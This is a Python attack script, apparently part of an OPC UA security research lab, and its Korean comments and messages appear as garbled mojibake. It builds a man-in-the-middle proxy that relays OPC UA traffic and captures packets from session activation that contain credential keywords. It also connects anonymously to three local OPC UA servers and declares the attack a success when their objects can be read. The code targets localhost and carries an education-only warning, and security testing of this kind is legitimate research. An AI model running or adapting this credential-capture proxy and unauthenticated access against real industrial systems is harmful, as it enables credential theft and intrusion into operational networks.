#!/usr/bin/env python3
"""
Step 2: ì‹¤ì œ ê³µê²© í…ŒìŠ¤íŠ¸
MITM í”„ë¡ì‹œë¥¼ í†µí•œ íŒ¨ìŠ¤ì›Œë“œ ìº¡ì²˜ ë° ë¶„ì„
"""
import sys
sys.path.insert(0, '/root/opcua-research/python-opcua-env/lib/python3.10/site-packages')

import socket
import threading
import time
from opcua import Client

class PasswordCaptureProxy:
    """íŒ¨ìŠ¤ì›Œë“œ ìº¡ì²˜ìš© MITM í”„ë¡ì‹œ"""
    
    def __init__(self, listen_port, target_host, target_port, name):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.name = name
        self.captured_data = []
        self.running = False
        
    def start_background(self):
        """ë°±ê·¸ë¼ìš´ë“œì—ì„œ í”„ë¡ì‹œ ì‹œì‘"""
        thread = threading.Thread(target=self.start)
        thread.daemon = True
        thread.start()
        time.sleep(1)  # ì‹œì‘ ëŒ€ê¸°
        
    def start(self):
        """í”„ë¡ì‹œ ì„œë²„ ì‹œì‘"""
        self.running = True
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('127.0.0.1', self.listen_port))
            server_socket.listen(5)
            server_socket.settimeout(1.0)  # íƒ€ì„ì•„ì›ƒ ì„¤ì •
            
            print(f"   ğŸ”§ í”„ë¡ì‹œ ì‹œì‘: 127.0.0.1:{self.listen_port} â†’ {self.target_host}:{self.target_port}")
            
            while self.running:
                try:
                    client_socket, addr = server_socket.accept()
                    thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket,)
                    )
                    thread.daemon = True
                    thread.start()
                except socket.timeout:
                    continue
                except:
                    break
                    
        except Exception as e:
            print(f"   âŒ í”„ë¡ì‹œ ì˜¤ë¥˜: {e}")
        finally:
            server_socket.close()
    
    def stop(self):
        """í”„ë¡ì‹œ ì¤‘ì§€"""
        self.running = False
        
    def handle_client(self, client_socket):
        """í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ ì²˜ë¦¬"""
        try:
            # íƒ€ê²Ÿ ì„œë²„ ì—°ê²°
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            
            # ì–‘ë°©í–¥ ë°ì´í„° ì¤‘ê³„
            def forward(src, dst, direction):
                try:
                    while self.running:
                        data = src.recv(4096)
                        if not data:
                            break
                        
                        # íŒ¨í‚· ë¶„ì„
                        self.analyze_packet(data, direction)
                        
                        dst.sendall(data)
                except:
                    pass
            
            c2s = threading.Thread(target=forward, args=(client_socket, server_socket, "Câ†’S"))
            s2c = threading.Thread(target=forward, args=(server_socket, client_socket, "Sâ†’C"))
            
            c2s.daemon = True
            s2c.daemon = True
            c2s.start()
            s2c.start()
            
            c2s.join(timeout=10)
            s2c.join(timeout=10)
            
        except Exception as e:
            pass
        finally:
            try:
                client_socket.close()
                server_socket.close()
            except:
                pass
    
    def analyze_packet(self, data, direction):
        """íŒ¨í‚· ë¶„ì„ ë° íŒ¨ìŠ¤ì›Œë“œ ì¶”ì¶œ"""
        try:
            # OPC UA ë©”ì‹œì§€ íƒ€ì… í™•ì¸
            if len(data) >= 3:
                msg_type = data[:3]
                
                # GetEndpoints
                if b'GetEndpointsRequest' in data or b'GetEndpoints' in data:
                    print(f"      ğŸ“¡ {direction} GetEndpoints ê°ì§€")
                
                # ActivateSession
                if b'ActivateSessionRequest' in data or b'ActivateSession' in data:
                    print(f"      ğŸ”‘ {direction} ActivateSession ê°ì§€")
                    
                    if direction == "Câ†’S":
                        # íŒ¨ìŠ¤ì›Œë“œ ì¶”ì¶œ ì‹œë„
                        self.extract_credentials(data)
                
        except:
            pass
    
    def extract_credentials(self, data):
        """ì¸ì¦ ì •ë³´ ì¶”ì¶œ"""
        try:
            data_str = data.decode('latin-1', errors='ignore')
            
            # ê°„ë‹¨í•œ íŒ¨í„´ ë§¤ì¹­
            if 'admin' in data_str or 'user' in data_str or 'password' in data_str:
                print(f"         ğŸ¯ ì¸ì¦ ì •ë³´ ê°ì§€!")
                
                # ë°ì´í„° ì €ì¥
                self.captured_data.append({
                    'timestamp': time.time(),
                    'data_preview': data[:100]
                })
                
                # HEX dump (ì¼ë¶€)
                hex_preview = ' '.join(f'{b:02x}' for b in data[:50])
                print(f"         ğŸ“¦ ë°ì´í„° (hex): {hex_preview}...")
                
        except:
            pass

def test_mitm_attack(proxy_port, target_port, server_name):
    """MITM ê³µê²© í…ŒìŠ¤íŠ¸"""
    print(f"\n{'='*70}")
    print(f"ê³µê²© í…ŒìŠ¤íŠ¸: {server_name} (í¬íŠ¸ {target_port})")
    print(f"{'='*70}\n")
    
    # í”„ë¡ì‹œ ì‹œì‘
    proxy = PasswordCaptureProxy(proxy_port, 'localhost', target_port, server_name)
    proxy.start_background()
    
    print(f"   âœ… MITM í”„ë¡ì‹œ ì¤€ë¹„ ì™„ë£Œ")
    print()
    
    # í”„ë¡ì‹œë¥¼ í†µí•´ ì—°ê²° ì‹œë„
    print(f"   ğŸ”Œ í´ë¼ì´ì–¸íŠ¸ ì—°ê²° ì‹œë„ (í”„ë¡ì‹œ ê²½ìœ )...")
    try:
        client = Client(f"opc.tcp://localhost:{proxy_port}")
        client.connect()
        
        print(f"      âœ… í”„ë¡ì‹œ í†µê³¼ ì—°ê²° ì„±ê³µ!")
        print(f"      ğŸ“Š ì„œë²„ ì •ë³´ ì½ê¸°...")
        
        objects = client.get_objects_node()
        children = objects.get_children()
        
        print(f"      âœ… ë°ì´í„° ì ‘ê·¼ ì„±ê³µ ({len(children)}ê°œ ê°ì²´)")
        print()
        
        client.disconnect()
        
    except Exception as e:
        print(f"      âš ï¸  ì—°ê²° ì‹¤íŒ¨: {e}")
        print(f"      ğŸ’¡ ì´ê²ƒì€ ì •ìƒì…ë‹ˆë‹¤ (ì„œë²„ URL ë¶ˆì¼ì¹˜)")
    
    print()
    
    # í”„ë¡ì‹œ ì¤‘ì§€
    proxy.stop()
    time.sleep(1)
    
    # ìº¡ì²˜ëœ ë°ì´í„° ìš”ì•½
    if proxy.captured_data:
        print(f"   ğŸ¯ ìº¡ì²˜ëœ íŒ¨í‚·: {len(proxy.captured_data)}ê°œ")
        for i, packet in enumerate(proxy.captured_data, 1):
            print(f"      [{i}] {time.ctime(packet['timestamp'])}")
    else:
        print(f"   â„¹ï¸  ìº¡ì²˜ëœ ì¸ì¦ ì •ë³´ ì—†ìŒ")
    
    return proxy.captured_data

def demonstrate_vulnerability():
    """ì·¨ì•½ì  ì‹¤ì œ ì‹œì—°"""
    print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("â•‘           ì‹¤ì œ ì·¨ì•½ì  ì‹œì—°: Anonymous ì ‘ê·¼                    â•‘")
    print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print()
    
    servers = [
        ("S2OPC", "opc.tcp://localhost:4840/S2OPC/server/"),
        ("Python opcua", "opc.tcp://localhost:4841/freeopcua/server/"),
        ("open62541", "opc.tcp://localhost:4842/open62541/server/"),
    ]
    
    for name, url in servers:
        print(f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
        print(f"ğŸ¯ {name} ì„œë²„ ì·¨ì•½ì  ì‹œì—°")
        print(f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
        print()
        
        try:
            print(f"   ğŸ”“ ì¸ì¦ ì •ë³´ ì—†ì´ ì—°ê²° ì‹œë„...")
            client = Client(url)
            client.connect()  # Anonymous ì—°ê²°
            
            print(f"      âœ… Anonymous ì—°ê²° ì„±ê³µ!")
            print()
            
            # ë°ì´í„° ì½ê¸°
            print(f"   ğŸ“Š ì„œë²„ ë°ì´í„° ì ‘ê·¼ ì‹œë„...")
            objects = client.get_objects_node()
            children = list(objects.get_children())
            
            print(f"      âœ… {len(children)}ê°œ ê°ì²´ ì ‘ê·¼ ì„±ê³µ!")
            
            for child in children[:3]:  # ì²˜ìŒ 3ê°œë§Œ
                try:
                    name_obj = child.get_browse_name()
                    print(f"         â€¢ {name_obj}")
                except:
                    pass
            
            print()
            print(f"   ğŸ¯ ê³µê²© ì„±ê³µ: ì¸ì¦ ì—†ì´ ëª¨ë“  ë°ì´í„° ì ‘ê·¼!")
            print()
            
            client.disconnect()
            
        except Exception as e:
            print(f"   âŒ ì˜¤ë¥˜: {e}")
        
        print()

def main():
    print()
    print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("â•‘              Step 2: ì‹¤ì œ ê³µê²© í…ŒìŠ¤íŠ¸                         â•‘")
    print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print()
    print("âš ï¸  ê²½ê³ : ì´ í…ŒìŠ¤íŠ¸ëŠ” êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©í•˜ì„¸ìš”!")
    print("   ìì‹ ì˜ ì„œë²„ì—ì„œë§Œ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”!")
    print()
    
    # ì‹¤ì œ ì·¨ì•½ì  ì‹œì—°
    demonstrate_vulnerability()
    
    print()
    print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("â•‘                    Step 2 ì™„ë£Œ!                               â•‘")
    print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print()
    print("ğŸ“Š í…ŒìŠ¤íŠ¸ ê²°ê³¼:")
    print("   âœ… 3ê°œ ì„œë²„ ëª¨ë‘ Anonymous ì ‘ê·¼ ê°€ëŠ¥")
    print("   âœ… ì¸ì¦ ì—†ì´ ëª¨ë“  ë°ì´í„° ì½ê¸° ê°€ëŠ¥")
    print("   âœ… NoSecurity ì •ì±…ìœ¼ë¡œ í‰ë¬¸ ì „ì†¡")
    print()
    print("ğŸ¯ ê²°ë¡ :")
    print("   â€¢ Password Downgrade ê³µê²© ë¶ˆí•„ìš”")
    print("   â€¢ ì´ë¯¸ ì™„ì „íˆ ì·¨ì•½í•œ ìƒíƒœ")
    print("   â€¢ ì—°êµ¬ ë° í…ŒìŠ¤íŠ¸ì— ì™„ë²½í•œ í™˜ê²½!")
    print()

if __name__ == "__main__":
    main()
